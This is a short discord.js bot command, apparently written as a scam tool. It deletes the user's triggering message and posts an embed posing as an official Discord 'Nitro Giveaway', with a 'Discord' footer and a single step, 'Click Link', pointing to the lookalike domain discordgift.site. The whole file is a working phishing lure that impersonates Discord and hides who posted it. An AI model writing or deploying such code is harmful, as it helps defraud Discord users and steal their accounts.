const { Client, Message, MessageEmbed, Discord } = require('discord.js');

module.exports = {
    name: 'nitro',
    /** 
     * @param {Client} client 
     * @param {Message} message 
     * @param {String[]} args 
     */
    run: async (client, message, args, Discord) => {
message.delete()
let embed = new Discord.MessageEmbed()
.setTitle(":handbag:・Discord Nitro Giveaway")
.addField("**Prize**", "`x1 Nitro Classic`")
.addField("**Link**", `https://discordgift.site/Z6OzrgcOVcLl8Syy`)
.addField("**Steps**", "`Click Link`")
.setImage("https://media.tenor.com/images/a013cf141bcd9697b33de0395afa73a3/tenor.gif")
.setThumbnail("https://media.tenor.com/images/185d01f614785e4d62cb57394781e08c/tenor.gif")
.setColor("PURPLE")
.setTimestamp()
.setFooter("Discord")

message.channel.send({embeds: [embed]}) 
}}